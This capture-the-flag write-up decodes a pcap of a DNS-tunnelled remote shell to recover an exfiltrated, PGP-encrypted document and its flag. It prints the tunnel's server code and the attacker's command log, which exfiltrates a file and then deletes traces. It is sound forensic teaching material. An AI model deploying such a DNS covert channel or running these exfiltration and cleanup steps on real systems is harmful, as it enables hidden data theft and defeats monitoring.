# Exfil

>exfil (100)
>
>Solves: 140
>
>We hired somebody to gather intelligence on an enemy party. But apparently they managed to lose the secret document they extracted. They just [sent us this](https://33c3ctf.ccc.ac/uploads/exfil-e5e0066760f0dd16e38abc0003aec40f39f9adf9.tar.xz) and said we should be able to recover everything we need from it.
>
>Can you help?

After downloading the file, we see two files; [server.py](server.py) and [dump.pcap](dump.pcap).

Opening up the pcap in Wireshark, we see that the dump is a long conversation over DNS:

![Alt text](wireshark_conv.png?raw=true "Title")

But the DNS questions and anwers themselves are very strange:

![Alt text](wireshark_packet.png?raw=true "Title")

An example query is  ```G4JQAAADAB2WSZB5GEYDAMJIMZYGK5DSPEUSAZ3JMQ6TCMBQGEUGM4DFORZHSK.JAM5ZG65LQOM6TCMBQGEUGM4DFORZHSKIK.eat-sleep-pwn-repeat.de.```.

Those queries are very strange indeed, and the python server must be consulted before deriving more information about the queries.
Upon examination of the server, we see that a remote shell is being launched 

	if __name__ == '__main__':
	    stream = TransportLayer(0x1337)
	    host = sys.argv[1]
	    port = int(sys.argv[2])

	    loop = asyncio.get_event_loop()
	    listen = loop.create_datagram_endpoint(
		    lambda: Server(stream), local_addr=(host, port))
	    transport, protocol = loop.run_until_complete(listen)

	    shell = RemoteShell(stream)
	    try:
		loop.run_until_complete(shell.main_loop())
	    except KeyboardInterrupt:
		pass
	    transport.close()
	    loop.close()

The remote shell class sound interesting:

	class RemoteShell:
	    def __init__(self, stream):
		self.stream = stream
		self.stream.on_data(self.remote_handler)

	    async def main_loop(self):
		reader = asyncio.StreamReader()
		reader_protocol = asyncio.StreamReaderProtocol(reader)
		await asyncio.get_event_loop().connect_read_pipe(lambda: reader_protocol, sys.stdin)

		while True:
		    line = await reader.readline()
		    if not line:
			break
		    self.stream.write(line)

	    def remote_handler(self):
		data = self.stream.read()
		sys.stdout.buffer.write(data)
		sys.stdout.flush()

In particular, the remote_handler, that read from the stream and write to stdout.
Here, that stream is a transport layer object:

	class TransportLayer:
	    def __init__(self, conn_id):
		self.outbuf = b''
		self.seq = 0
		self.inbuf = b''
		self.ack = 0
		self.conn_id = conn_id
		self.read_cb = None

	    def on_data(self, cb):
		self.read_cb = cb

	    def read(self):
		res = self.inbuf
		self.inbuf = b''
		return res

	    def write(self, data):
		self.outbuf += data

	    def process_packet(self, packet):
		assert len(packet) >= 6

		conn_id, seq, ack = struct.unpack('<HHH', packet[:6])
		data = packet[6:]
		# print('process_packet: conn=%d seq=%d/%d ack=%d/%d data=%r' % (
		    # conn_id, seq, self.ack, ack, self.seq, data))

		assert conn_id == self.conn_id
		if seq == self.ack:
		    self.inbuf += data
		    self.ack += len(data)
		    if data and self.read_cb:
			asyncio.get_event_loop().call_later(0, self.read_cb)
		else:
		    # print('Received out of band data with seq nr %d/%d' % (seq, self.ack))
		    assert seq < self.ack

		if ack > self.seq:
		    forget = ack - self.seq
		    assert forget <= len(self.outbuf)
		    self.outbuf = self.outbuf[forget:]
		    self.seq += forget
		return len(data)

	    def make_packet(self, max_size):
		payload_size = min(len(self.outbuf), max_size - 6)
		data = self.outbuf[:payload_size]
		# print('make_packet: conn=%d seq=%d ack=%d data=%r' % (self.conn_id, self.seq, self.ack, data))
		packet = struct.pack('<HHH', self.conn_id, self.seq, self.ack) + data
		return packet

	    def has_data(self):
		return len(self.outbuf) > 0

That upon receiving data, the contents of the in-buffer is written to standard out is not helpful, and we have to dig deeper, meaning that we have to determine how the inbuf is set.
The inbuf is changed in ```process_packet```, and is simply the packet, after slicing off the connetion ID, seq and ack numbers.
This is starting to seem like the sever implement a very simplified version of TCP, which can be placed in the category of reliable data transfer.
In particular, the first six bytes are used for three shorts, and the rest of the bytes will be data.

The packet used as input for the ```process_packet``` come from the server:

	class Server:
	    def __init__(self, stream):
		self.stream = stream

	    def connection_made(self, transport):
		self.transport = transport

	    def datagram_received(self, data, addr):
		query = DNSRecord.parse(data)

		packet = parse_name(query.q.qname)
		self.stream.process_packet(packet)

		packet = self.stream.make_packet(130)
		response = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1, ra=1),
			      q=query.q,
			      a=RR(domain, QTYPE.CNAME, rdata=CNAME(data_to_name(packet))))

		self.transport.sendto(response.pack(), addr)

Where data is the DNS record, and the qname of the question is extracted to be parsed using:

	def decode_b32(s):
	    s = s.upper()
	    for i in range(10):
		try:
		    return base64.b32decode(s)
		except:
		    s += b'='
	    raise ValueError('Invalid base32')

	def parse_name(label):
	    return decode_b32(b''.join(label.label[:-domain.count('.')-1]))

This mean that the label could be ```G4JWYAQFAM.eat-sleep-pwn-repeat.de.```, and the label method is practically the same as calling split('.') on it.
Which would result in base32 decoding ```G4JWYAQFAM``` and passed into ```process_packet```.

When we have both the server and the PCAP dump, it is quite easy to extract the conversation with some slight modification of the server.
First, we extract the question names removing all protocol data and writing the questions and answers separately.

	#!/usr/bin/python
	from scapy.all import  *
	import base64

	packets = rdpcap("dump.pcap")

	questions = open("questions", "wb")
	answers = open("answers", "wb")
	for p in packets:
		if p.an is None:
			questions.write(p.qd.qname + b"\n")
		else:
			answers.write(p.an.rdata + b"\n")

	questions.close()
	answers.close()

After writing these two files, they must be fed into the modified server.
The server is modified in the following way:

	class TransportLayer:
	    def process_packet2(self, packet):
		assert len(packet) >= 6

		conn_id, seq, ack = struct.unpack('<HHH', packet[:6])
		data = packet[6:]
		print('process_packet: conn=%d seq=%d/%d ack=%d/%d data=%r' % (
		    conn_id, seq, self.ack, ack, self.seq, data))

		assert conn_id == self.conn_id
		if seq == self.ack:
		    self.inbuf += data
		    self.ack += len(data)
		    if data and self.read_cb:
			asyncio.get_event_loop().call_later(0, self.read_cb)
		else:
		    print('Received out of band data with seq nr %d/%d' % (seq, self.ack))
		    assert seq < self.ack
		    return b""

		if ack > self.seq:
		    forget = ack - self.seq
		    #assert forget <= len(self.outbuf)
		    self.outbuf = self.outbuf[forget:]
		    self.seq += forget
		return data

	domain = 'eat-sleep-pwn-repeat.de.'

	def decode_b32(s):
	    s = s.upper()
	    for i in range(10):
		try:
		    return base64.b32decode(s)
		except:
		    s += b'='
	    raise ValueError('Invalid base32')

	def parse_name2(name):
	    sp_n = name.split(b'.')
	    chosen = sp_n[:-domain.count('.')-1]
	    stuff = b''.join(chosen)
	    return decode_b32(b''.join(chosen))

	if __name__ == '__main__':
	    stream = TransportLayer(0x1337)
	    u = open("questions_translated", "wb")
	    with open("./questions") as f:
		for l in f:
		    l = l.replace('\n', '')
		    name = parse_name2(l.encode())
		    parsed = stream.process_packet2(name)
		    u.write(parsed)

	    u.close()

Which will open the questions data, parse the name and process the packet before the data is written to a file. The procedure is the same for the answers data.
Upon examining the translated answers file, the following is discovered:

	gpg: directory `/home/fpetry/.gnupg' created
	gpg: new configuration file `/home/fpetry/.gnupg/gpg.conf' created
	gpg: WARNING: options in `/home/fpetry/.gnupg/gpg.conf' are not yet active during this run
	gpg: keyring `/home/fpetry/.gnupg/secring.gpg' created
	gpg: keyring `/home/fpetry/.gnupg/pubring.gpg' created
	gpg: /home/fpetry/.gnupg/trustdb.gpg: trustdb created
	gpg: key D0D8161F: public key "operator from hell <team@kitctf.de>" imported
	gpg: key D0D8161F: secret key imported
	gpg: key D0D8161F: "operator from hell <team@kitctf.de>" not changed
	gpg: Total number processed: 2
	gpg:               imported: 1  (RSA: 1)
	gpg:              unchanged: 1
	gpg:       secret keys read: 1
	gpg:   secret keys imported: 1
	key
	secret.docx
	total 56K
	2624184 drwxr-xr-x 3 fpetry fpetry 4.0K Dec 17 13:31 .
	2621441 drwxr-xr-x 5 root   root   4.0K Dec 17 13:06 ..
	2631209 -rw------- 1 fpetry fpetry   42 Dec 17 13:07 .bash_history
	2627663 -rw-r--r-- 1 fpetry fpetry  220 Dec 17 13:06 .bash_logout
	2631208 -rw-r--r-- 1 fpetry fpetry 3.7K Dec 17 13:06 .bashrc
	2631219 drwx------ 2 fpetry fpetry 4.0K Dec 17 13:31 .gnupg
	2631217 -rw-rw-r-- 1 fpetry fpetry 5.2K Dec 17 13:31 key
	2631221 -rw------- 1 fpetry fpetry   33 Dec 17 13:24 .lesshst
	2627664 -rw-r--r-- 1 fpetry fpetry  675 Dec 17 13:06 .profile
	2631216 -rw-r--r-- 1 fpetry fpetry 4.0K Dec 17 13:17 secret.docx
	2631222 -rw-rw-r-- 1 fpetry fpetry 4.4K Dec 17 13:31 secret.docx.gpg

If we also take a look at the questions, we see:
	
	id
	ls -alih
	cat > key << EOF
	-----BEGIN PGP PUBLIC KEY BLOCK-----

	mQENBFhNxEIBCACokqjLjvpwnm/lCdKTnT/vFqnohml2xZo/WiMAr4h3CdTal4yf
	...
	qAu62S/zlv+fGfdzCZnubp254S3mLsyokuyZ7xjy/i0m2a5fVQ==
	=+woj
	-----END PGP PRIVATE KEY BLOCK-----
	EOF
	gpg --import key
	ls
	gpg --encrypt --recipient team@kitctf.de --trust-model always secret.docx
	ls -alih
	echo -n START_OF_FILE ; cat secret.docx.gpg; echo END_OF_FILE
	[?1;2c[?1;2c[?1;2c[?
	rm key
	rm secret.docx.gpg
	ls -alih
	rm -rf .gnupg
	ls -alih
	exit

The secret is in the secret.docx file, and the private and public parts of the PGP keys is available to us regardless of only the encrypted file ```secrets.docx.gpg``` being available.
Based on this stream, we can extract both the PGP keys and the encrypted document.
After extracting both, the PGP key can be imported using ```gpg --import key```.
Then the encrypted document can be decrypted using ```gpg --decrypt secret.docx.gpg```.

Upon extracting secret.docx.gpg directly from the translated dump; the data turned out to be erroneous, leading to a simple change to the extraction script:

	if __name__ == '__main__':
	    write = False
	    stream = TransportLayer(0x1337)
	    u = open("secret.docx.gpg", "wb")
	    with open("answers") as f:
		for l in f:
		    l = l.replace('\n', '')
		    name = parse_name2(l.encode())
		    parsed = stream.process_packet2(name)
		    if b"START_OF_FILE" in parsed:
			parsed = parsed.split(b"START_OF_FILE")[1]
			write = True
		    if write == True:
			if b"END_OF_FILE" in parsed:
			    parsed = parsed.split(b"END_OF_FILE")[0]
			    u.write(parsed)
			    write = False
			    continue
			u.write(parsed)

	    u.close()

Resulting in a correct extraction of secret.docx.gpg that could be decrypted as explained above.

Finally, opening the secret.docx give the flag: ```33C3_g00d_d1s3ct1on_sk1llz_h0mie```
